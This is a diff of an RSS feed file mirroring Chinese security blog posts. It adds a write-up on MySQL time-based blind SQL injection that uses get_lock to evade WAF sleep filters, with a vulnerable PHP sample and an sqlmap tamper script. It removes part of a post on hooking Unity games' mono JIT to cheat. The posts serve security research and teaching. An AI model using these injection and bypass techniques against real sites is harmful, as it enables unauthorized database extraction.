@@ -5,7 +5,91 @@
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
 <description></description>
 <language>zh-cn</language>
-<lastBuildDate>Fri, 30 Mar 2018 04:41:48 +0800</lastBuildDate>
+<lastBuildDate>Thu, 05 Apr 2018 06:33:05 +0800</lastBuildDate>
+<item>
+<title>一种新型SQL时间盲注攻击探索</title>
+<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-04-03-35245598.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35245598&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0cd460758b08a7f1950d7ee754c468f5_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/879a0dd1ccf71649de0eeb3327f42f59&quot; data-hash=&quot;879a0dd1ccf71649de0eeb3327f42f59&quot; data-hovercard=&quot;p$b$879a0dd1ccf71649de0eeb3327f42f59&quot;&gt;@do9gy&lt;/a&gt; &lt;/p&gt;&lt;p&gt;现就职于长亭科技，长期从事渗透测试，WAF攻防对抗工作，喜欢小狗。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;SQL注入漏洞由来已久，关于盲注方面一直都是安全爱好者喜欢研究的话题。记得最早了解到DNS外传的思路是在oldjun的博客，当时被这种技巧所吸引，不过该方法依赖于mysql版本和window环境的限制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;首先介绍一下什么是SQL盲注&lt;/h2&gt;&lt;blockquote&gt;在SQL注入中，往往需要引入“超出预期”的SQL语句，最好是希望将“额外”的查询内容直接显示在页面上，使用的手法有：“报错查询（error-based）”、“联合查询（union-select）”。对于无法直接回显出内容的情况需要依赖true／false差异判断（boolean）、时间对比（time-based）、DNS外传数据查询（data exfiltration through DNS channel）等方法进行捕获。例如：“select if(user()=&#39;root@localhost&#39;,sleep(4),null)“ 当网站用户是”root@localhost“时，会延长4秒钟后返回结果，当用户不是”root@localhost“时，会立即返回，由此可以判断系统中的用户，利用同样的方法可以猜测出权限范围内所有数据库所有表中存放的内容。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;关于mysql时间类型（time-based）的注入，一直以来众所周知的有三种方法——sleep、benchmark、笛卡尔积。所以许多市面上的WAF产品也是基于此类规则去防护的。&lt;/p&gt;&lt;p&gt;但是sql时间类型的盲注本质是&lt;b&gt;利用插入的SQL语句执行造成时间延迟&lt;/b&gt;，所以只要可以大于平均网络延迟2倍以上，就可以作为执行成功的判断依据，而大多数网站的平均响应时间在100ms以内，所以我们需要制造能达到200ms以上的时间延长的语句。&lt;/p&gt;&lt;p&gt;今天我们要提到的一个mysql函数是 get_lock函数，先来看一下mysql文档中对其的描述：&lt;/p&gt;&lt;p&gt;GET_LOCK(str,timeout)&lt;/p&gt;&lt;p&gt;Tries&lt;br&gt;to obtain a lock with a name given by the string str, using a timeout of&lt;br&gt;timeout seconds. A negative timeout value means infinite timeout. The lock is&lt;br&gt;exclusive. While held by one session, other sessions cannot obtain a lock of&lt;br&gt;the same name.&lt;/p&gt;&lt;p&gt;在一个session中可以先锁定一个变量例如：select get_lock(‘do9gy’,1)&lt;/p&gt;&lt;p&gt;然后通过另一个session 再次执行get_lock函数 select get_lock(‘do9gy’,5),此时会产生5 秒的延迟，其效果类似于sleep(5)。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;mysql&amp;gt; select get_lock(&#39;do9gy&#39;,1);
++---------------------+
+| get_lock(&#39;do9gy&#39;,1) |
++---------------------+
+|                   1 |
++---------------------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select get_lock(&#39;do9gy&#39;,5);
++---------------------+
+| get_lock(&#39;do9gy&#39;,5) |
++---------------------+
+|                   0 |
++---------------------+
+1 row in set (5.00 sec)
+&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;于是我们可以，将此方法用于SQL注入的判断，但是利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。&lt;/p&gt;&lt;p&gt;下面我们给出一个示例：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
+require &#39;conn.php&#39;;
+$id = $_GET[&#39;id&#39;];
+if(preg_match(&quot;/(sleep|benchmark|outfile|dumpfile|load_file|join)/i&quot;, $_GET[&#39;id&#39;]))
+{
+    die(&quot;403 forbidden!&quot;);
+}
+$sql = &quot;select * from article where id=&#39;&quot;.intval($id).&quot;&#39;&quot;;
+$res = mysql_query($sql);
+if(!$res){
+    die(&quot;404 not found!&quot;);
+}
+$row = mysql_fetch_array($res, MYSQL_ASSOC);
+print_r($row);
+mysql_query(&quot;update view set view_times=view_times+1 where id = &#39;&quot;.$id.&quot; &#39;&quot;);
+?&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;该案例中，我们可以构造SQL语句 ?id=1&lt;br&gt;and get_lock(‘do9gy’,1)&lt;/p&gt;&lt;p&gt;注意：由于get_lock需要变换session请求，所以当执行完第一次以后需要停滞一段时间（半分钟左右），让Apache重新打开一个连接mysql的s&lt;/p&gt;&lt;p&gt;ession，此时就可以利用get_lock进行探测了。这里给出一个基于sqlmap的tamper：&lt;/p&gt;&lt;p&gt;&lt;b&gt;sleeptogetlock.py&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/usr/bin/env python
+
+&quot;&quot;&quot;
+Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+See the file &#39;doc/COPYING&#39; for copying permission
+&quot;&quot;&quot;
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.HIGHEST
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    &quot;&quot;&quot;
+    Replaces instances like &#39;SLEEP(A)&#39; with &quot;get_lock(&#39;do9gy&#39;,A)&quot;
+
+    Requirement:
+        * MySQL
+
+    Tested against:
+        * MySQL 5.0 and 5.5
+
+    Notes:
+        * Useful to bypass very weak and bespoke web application firewalls
+          that filter the SLEEP() and BENCHMARK() functions
+
+    &amp;gt;&amp;gt;&amp;gt; tamper(&#39;SLEEP(2)&#39;)
+    &quot;get_lock(&#39;do9gy&#39;,2)&quot;
+    &quot;&quot;&quot;
+
+    if payload and payload.find(&quot;SLEEP&quot;) &amp;gt; -1:
+        while payload.find(&quot;SLEEP(&quot;) &amp;gt; -1:
+            index = payload.find(&quot;SLEEP(&quot;)
+            depth = 1
+            
+            num = payload[index+6]
+
+            
+            newVal = &quot;get_lock(&#39;do9gy&#39;,%s)&quot; % (num)
+            payload = payload[:index] + newVal + payload[index+8:]
+
+
+    return payload
+&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当遇到网站过滤单引号的情况也可以使用 get_lock(1,1) 锁定数字变量绕过。&lt;/p&gt;&lt;p&gt;最后，想声明的是本方法只是笔者依据时间注入本质原理进行的一次探索，现实环境中不一定有大量合适的环境，最重要的是保持一颗不断突破瓶颈，抱有幻想和希望的心。如有不实之处还望诸君斧正。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
+<author>小蘑菇</author>
+<guid isPermaLink="false">2018-04-03-35245598</guid>
+<pubDate>Tue, 03 Apr 2018 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>客户端 session 导致的安全问题</title>
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-26-34936378.html</link>
@@ -751,171 +835,6 @@ Middleware/wlserver_10.3/server/lib/wls-wsat.war&lt;/code&gt;&lt;p&gt;以上路�
 <author>perhaps</author>
 <guid isPermaLink="false">2017-11-21-31256263</guid>
 <pubDate>Tue, 21 Nov 2017 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>Unity游戏菜鸡玩家的制胜之路</title>
-<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-11-07-30703785.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30703785&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6de83ed6f668f836c15e2e6f1b2dbf37_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：赵奇&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;笔者一直自认玩过不少游戏，无奈水平太菜，日常送人头。痛定思痛，决定冲(xie)冠(xiu)一(gai)怒(qi)，经过几次失败的尝试之后，终于搞定了几款时下热门的Unity游戏。出于各种原因，本文以一款不具名的国外游戏作为实例，分享笔者研究过程中的一些心得，与各位分享。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X00 打包党的鶸改法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先采用最简单的打包党策略，演示一下如何快速修改一款单机游戏的金币/宝石等资源。这部分快速带过，主要负责熟悉 Unity 游戏结构，时至今日已经不算一种技术了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先将游戏安装 APK 解包，这里使用 apktool 或者直接看作 zip 解包是没有区别的，因为游戏严重依赖框架，Java 层和 Manifest 等文件价值不大。作为 Unity 游戏的一个特征点，可以很明显的发现这样一个文件夹。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f9320e6f5de0d528d1a8bd36a5bc0e05_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;607&quot; data-rawheight=&quot;377&quot;&gt;&lt;p&gt;Assembly-CSharp.dll 等几个文件是 Unity 游戏最鲜明的特点。通过 file 或者 binwalk 查看可以发现它们是 C# 字节码格式（ IL ），这种格式如果不进行加密，可以轻松的还原 C#指令。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来在手机中安装一次游戏，看一下大致的游戏逻辑，确定需要修改什么。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9dd04206c80d68d8d1f883a87870941e_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;999&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;看起来右上角的宝石不错。。。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;一般来说在游戏里边宝石都是稀缺资源，这里以其作为目标。为了快速定位，尝试使用 diamond ，gem 等字符串在 cs源码中进行全局搜索，很快就能定位到关键位置。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void SetupFirebaseDefault()
-	{
-		this.Defaults.Add(&quot;EnergyStart&quot;, 20);
-		this.Defaults.Add(&quot;InitialEnergy&quot;, 75);
-		this.Defaults.Add(&quot;EnergyFillerSecs&quot;, 420);
-		this.Defaults.Add(&quot;InitialGold&quot;, 200);
-		this.Defaults.Add(&quot;InitialGems&quot;, 50);
-		this.Defaults.Add(&quot;XpRequirement&quot;, 75);
-		this.Defaults.Add(&quot;XpReqIncremental&quot;, 75);
-		this.Defaults.Add(&quot;XpAttackBonus&quot;, 5);
-		this.Defaults.Add(&quot;BubblesRequired&quot;, 6);
-		this.Defaults.Add(&quot;StoreBubbleCostsAddOn&quot;, 2);
-		this.Defaults.Add(&quot;ReviveCost&quot;, 100);
-		this.Defaults.Add(&quot;ShopTokenCost&quot;, 100);
-		this.Defaults.Add(&quot;ShopTokenCostIncremental&quot;, 75);
-		this.Defaults.Add(&quot;ShopTokenMax&quot;, 10);
-		this.Defaults.Add(&quot;ShopFigMax&quot;, 3);
-		this.Defaults.Add(&quot;ShopKeyMax&quot;, 5);
-		this.Defaults.Add(&quot;EnergyPricesInGemsBig&quot;, 200);
-		this.Defaults.Add(&quot;EnergyPricesInGemsSmall&quot;, 50);
-		this.Defaults.Add(&quot;EnergyPackageBig&quot;, 60);
-		this.Defaults.Add(&quot;EnergyPackageSmallMin&quot;, 5);
-		this.Defaults.Add(&quot;RepeatedFigurineTokenConversion&quot;, 7);
-		this.Defaults.Add(&quot;RefreshLootCost&quot;, 20);
-  		...
-}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;InitialGems&lt;/b&gt; 字段明显是初始宝石数的意思，OK就它了。C# 字节码的修改有很多种方式，比较方便的工具是 Reflector ，这里因为没有这个工具，使用 ILDASM 反编译，随后修改， ILASM 重编译回去的方法。这两个工具都是微软官方提供的，当然可以百度搜到。 ILDASM 具有图形化界面，直接从其中 dump 出来即可，随后修改 dump 出的 IL 文件如下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-15e025904749d92edc40d35aa06a10e5_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;122&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来使用 ILASM 命令 ilasm.exe &lt;a href=&quot;http://name.il/&quot;&gt;name.il&lt;/a&gt; /DLL 可以将 IL 文件回编译成 DLL ，将其替换 APK 包中的对应 DLL ，签名，安装之后可以发现修改生效了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5f36c27ef8344b7b5789693438fb3de2_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1019&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这就是 Unity 游戏打包党快速修改的过程，看起来很简单，但是却存在不少问题：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;这个游戏没有做任何保护，一旦存在保护，比如IL字节码加密，就需要去跟IL字节码加载的逻辑，伺机恢复明文IL字节码。&lt;/li&gt;&lt;li&gt;加壳问题，好在加壳是针对Java层的，考查了国内几款主流游戏之后发现基本没有加壳，因为壳并不能保证ELF文件的安全，ELF文件很可能使用其他安全策略。&lt;/li&gt;&lt;li&gt;重打包问题，国内游戏是不可能让你修改数据重打包的，特别是联网游戏，会有多处完整性校验，因此修改工作必须在运行过程中进行。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;综合以上，我们虽然完成了对一款毫无安全保护的 Unity 游戏的修改，但是为了进一步研究适用于更复杂条件下的修改策略，还需要进一步研究心得方案。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X01  注入与hook&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;考虑到国内主流游戏的安全机制，必须使用运行时修改的方式。比较理想的方式是先注入 zygote 进程。zygote 进程是 Dalvik 虚拟机的孵化器进程。众所周知，常规的 Android APP 是运行在 Dalvik 虚拟机（或者其继承者 ART ）中的，虚拟机需要加载很多运行所需的库（&lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;如&lt;/a&gt; &lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;libdvm.so&lt;/a&gt; ），并且初始化虚拟机对象。这个过程费时费力，为了保证应用的启动速度，zygote被设计为虚拟机进程的父进程。当应用启动时，直接从 zygote 上 fork() 出来，继承其虚拟内存空间。因此，注入到 zygote 进程的好处是先于应用代码执行，可以有效避免注入过程被应用的 anti-ptrace 机制检测到。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Android 平台上的注入已经是相对成熟的一套代码，最初是由看雪版主古河大大发布，随后出现了很多的更新、优化版本。其基本思路是利用 Linux 平台上的跨进程控制机制 ptrace ，通过对 ptrace 的封装实现目标进程的读、写，寄存器获取、保存、恢复，页状态变更、写入一段施工程序、远程调用施工程序，负责将待注入模块加载到目标内存中。这些内容前人之述备矣，这里贴几个相关链接，不在做具体展开。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-141355.htm&quot;&gt;[原创]发个Android平台上的注入代码-『Android安全』-看雪安全论坛&lt;/a&gt; libinject&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/jiayy/p/4286828.html&quot;&gt;android hook 框架 libinject2 简介、编译、运行&lt;/a&gt; libinject2&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/qq1084283172/article/details/53869796&quot;&gt;Android进程的so注入--Poison（稳定注入版） - 水汐。2014 的专栏 - CSDN博客&lt;/a&gt; Poison注入框架&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在完成注入之后，我们的功能代码即可在目标进程中执行，接下来需要在目标进程中执行 hook 过程。通过 hook 技术，可以截断一个函数的执行流程并插入自定义的代码。针对 zygote 注入，这个问题稍微复杂。因为在我们注入 zygote 的时机，游戏进程还没有启动，因此无法直接 hook 到目标函数。后面将会介绍到，我们的目标函数是 native 层的 c 函数。因为 zygote 进程最后会 fork 成游戏进程，为了感知游戏进程中目标函数的加载，可以监控该函数所在的库的加载，那么就需要用到 linker 中的 dlopen 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void *dlopen(const char *filename, int flags);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过 hook dlopen 函数并检查 filename 参数确定目标库的加载，随后再一次进行实际的功能性 hook ，hook 目标函数达到修改目的。也就是说，通过 zygote hook 的方式 hook 一个目标函数，需要进行两次 hook ，第一次是 hook linker 中的 dlopen 以确定目标模块的基址，第二次是在该模块中 hook 目标函数。这里有一个小问题是由于 dlopen 函数在每一个 zygote 的子进程中都会被 hook ，导致系统性能下降，一个解决方案是定期查看&lt;b&gt; /proc/pid/cmdline&lt;/b&gt; 如果自身不是目标进程那么就解除 hook 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;针对 Unity 游戏的 hook 思路大体如上，本节的最后再讲讲关于使用的 hook 框架。Hook 操作的原理可以理解为强行修改程序的代码段，通过修改目标地址上的字节码为 B ，JMP 等指令将指令流跳转到 hook 者控制的位置执行另一段指令。当然实际实现中复杂性远远大于这句描述，因为指令执行完毕之后通常需要返回到 hook 前的位置，如何保证 hook 点处指令、寄存器值等各种信息完好，是需要很大工作量的。Java 层的 hook 框架可以使用 XScript 、frida 、cydia substrate 等等，native 层笔者尝试过的有效工具有 cydia substrate和android-inline-hook ( &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt; )。ARM 平台上的 hook 工具开发有几个坑点，一个原因是由于 ARM 有大量位置相关代码，如果 hook 点在这种指令上，那么想要在异地恢复这条指令相当困难；另一个原因是 ARM 上存在 Thumb 指令集，需要考虑判断当前指令集并执行不同的操作。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了注入和 hook 两种工具，就可以完成对目标函数的运行时修改。下一节探讨针对 Unity 游戏，具体修改哪些函数可以完成对游戏逻辑的控制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  Mono加载C#字节码过程分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&amp;gt;  可能很多人都像我一样好奇过，Android 是一个类 Java 虚拟机部署在 Linux 平台上，怎么就跑起来了微软的 C# ？其实 C# 已经被 ECMA 组织标准化（虽然这组织和微软渊源颇深），并且标准基础上出现了一套运行时（ Common Language Runtime , CLR ）。这套运行时的具体实现是一个叫做 mono 的开源项目。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本节介绍 mono 执行 C# 字节码的过程。Android 上的 Unity 正是通过 mono 的 Just-in-time Compile 机制完成了从 C# 语言世界到 ARM 机器码世界的转化。接下来对 Mono 项目的源码中对 DLL 处理的逻辑做一个分析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先，mono 加载 DLL 文件之后，会进行预编译，首先调用 &lt;b&gt;/mono/mini/mini.c&lt;/b&gt; 中的 mono_precompile_assemblies 函数，该函数对所有需要加载的 assembly 文件逐个调用 mono_precompile_assembly 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void mono_precompile_assemblies ()
-{
-	GHashTable *assemblies = g_hash_table_new (NULL, NULL);
-
-	mono_assembly_foreach ((GFunc)mono_precompile_assembly, assemblies);
-
-	g_hash_table_destroy (assemblies);
-}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static void
-mono_precompile_assembly (MonoAssembly *ass, void *user_data)
-{
-	...
-	for (i = 0; i &amp;lt; mono_image_get_table_rows (image, MONO_TABLE_METHOD); ++i) {
-		method = mono_get_method (image, MONO_TOKEN_METHOD_DEF | (i + 1), NULL);
-		mono_compile_method (method);
-		if (strcmp (method-&amp;gt;name, &quot;Finalize&quot;) == 0) {
-			invoke = mono_marshal_get_runtime_invoke (method, FALSE);
-			mono_compile_method (invoke);
-		}
-	...
-}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这里摘取了 mono_precompile_assembly 函数的关键步骤。该函数中针对当前需要处理的的 assembly ，对其中每一个函数调用 mono_compile_method 进行编译，同时编译 invoke 。这个 invoke 是对应函数的一个包装器，当  mono最终调用函数时，会通过包装器调用而不是直接调用。因此在函数 compile 完成之后，会生成并编译 invoke 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来分析的关键是 mono_compile_method 函数，真正的编译过程发生在这个函数中。该函数不是唯一的，因为 mono 同时支持 AOT（ ahead of time ）编译，未来也可能添加其他功能。因此这个函数这里为一个函数指针，在 JIT 编译环境下执行的是 mono_jit_compile_method 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gpointer
-mono_jit_compile_method (MonoMethod *method)
-{
-	MonoException *ex = NULL;
-	gpointer code;
-
-	code = mono_jit_compile_method_with_opt (method, mono_get_optimizations_for_method (method, default_opt), &amp;amp;ex);
-	if (!code) {
-		g_assert (ex);
-		mono_raise_exception (ex);
-	}
-
-	return code;
-}
-&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个函数调用了 mono_jit_compile_method_with_opt 函数做具体操作，注意这里返回的是 gpointer 指针，其实这个指针指向的就是 DLL 脚本最终编译成汇编所在的地址，后续如果我们需要修改生成的汇编代码，修改这个指针即可。接下来我们稍微深入跟进一些。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static gpointer
-mono_jit_compile_method_with_opt (MonoMethod *method, guint32 opt, MonoException **ex)
-{
-	...
-    target_domain = mono_get_root_domain ();
-	info = lookup_method (target_domain, method); //先查表判断是否已经编译
-	if (info) {
-		/* We can&#39;t use a domain specific method in another domain */
-		if (! ((domain != target_domain) &amp;amp;&amp;amp; !info-&amp;gt;domain_neutral)) {
-			MonoVTable *vtable;
-			MonoException *tmpEx;
-
-			mono_jit_stats.methods_lookups++;
-			vtable = mono_class_vtable (domain, method-&amp;gt;klass);
-			g_assert (vtable);
-			tmpEx = mono_runtime_class_init_full (vtable, ex == NULL);
-			if (tmpEx) {
-				*ex = tmpEx;
-				return NULL;
-			}
-			return mono_create_ftnptr (target_domain, info-&amp;gt;code_start);
-		}
-	}
-
-	code = mono_jit_compile_method_inner (method, target_domain, opt, ex);//实际编译点
-	···
-	p = mono_create_ftnptr (target_domain, code);
-    ···
-	return p;
-}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这里隐去了编译 invoke 函数的代码和一些细枝末节的 check 。可以看到， mono_jit_compile_method_with_opt 函数的主要流程是首先查表看当前要编译的函数是否已经编译，如果已经编译，则直接返回编译好的结果；否则，调用 mono_jit_compile_method_inner 函数实际编译并注册到 target_domain 中，随后通过 mono_create_ftnptr 函数获取函数指针。因为这部分代码是复用的，除了首次加载 DLL 之外的一些情景也会调用该函数，其中存在一些函数已经编译的情况。 mono_jit_compile_method_inner 函数以下是一些与机器相关的具体机器码生成过程，对虚拟机感兴趣的朋友可以进一步学习，这里就不继续深究了，简单把整个调用过程整理一下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;graph TD;
-start--&amp;gt;mono_precompile_assemblies
-mono_precompile_assemblies--&amp;gt;|foreach|mono_precompile_assembly
-mono_precompile_assembly--&amp;gt;|函数体|mono_jit_compile_method
-mono_precompile_assembly--&amp;gt;|invoke|mono_marshal_get_runtime_invoke
-mono_marshal_get_runtime_invoke--&amp;gt;mono_jit_compile_method
-mono_jit_compile_method--&amp;gt;mono_jit_compile_method_with_opt
-mono_jit_compile_method_with_opt--&amp;gt;|已经编译过|mono_create_ftnptr
-mono_jit_compile_method_with_opt--&amp;gt;|没有编译过|mono_jit_compile_method_inner
-mono_jit_compile_method_inner--&amp;gt;mini_method_compile
-mini_method_compile--&amp;gt;mono_codegen
-mono_codegen--&amp;gt;mono_create_ftnptr
-mono_create_ftnptr--&amp;gt;finish&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;至此我们的分析完成了，尽管虚拟机可以使用花样繁多的语言开发，但是最终在执行前一需要恢复成本地机器码去执行。这就给了我们下 hook 的机会，下一节介绍通过修改 mono 编译出来的汇编函数逻辑，完成对游戏流程的动态修改。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X03  通过修改虚拟机生成的汇编指令修改游戏逻辑&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来我们尝试利用前面两节介绍的知识，修改游戏的执行逻辑.&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void MainButtonClicked()
-{
-	...
-		case UI_ConfirmationPopup.ScreenType.BuyCoins:
-		{
-			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
-			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
-			if (UserProfile.Gems &amp;gt;= num)
-			{
-				UserProfile.Gold += num2;
-				UserProfile.Gems -= num;
-				this.purchasedAmount = num2;
-				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
-				Events.Instance.UI_MARKET_PURCHASED();
-				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
-				this.CallItQuits();
-			}
-			else
-			{
-				this.DisableAssets(true);
-				this.LaunchOutOfGems();
-			}
-			break;
-		}
-	...
-}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们选择 MainButtonClicked 这个函数作为目标，其中的购买金币分支会检测当前钻石数量，如果数量够则进行购买，否则不进行购买。在 mono_jit_compile_method_with_opt 函数上下钩子，检查第一个参数 method 的 name 字段是否包含“ MainButtonClicked ”，在包含这个字段时，将 gpointer 指向的函数 dump 出来。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;	if(!strstr(name, &quot;MainButtonClicked&quot;)) return target(arg1, arg2, arg3);
-	LOGE(&quot;find MainButtonClicked&quot;);
-	void* funcptr = target(arg1, arg2, arg3);
-	LOGE(&quot;function MainButtonClicked base is: %0lx&quot;, funcptr);
-	int fd = open(&quot;/data/local/tmp/dump&quot;, O_WRONLY | O_CREAT);
-	if(fd == -1){
-		LOGE(&quot;open error: %s&quot;, strerror(errno));
-		exit(-1);
-	}
-	if(write(fd, funcptr, 0x1000 * 0x1000) == -1){
-		LOGE(&quot;write error: %s&quot;, strerror(errno));
-		exit(-1);
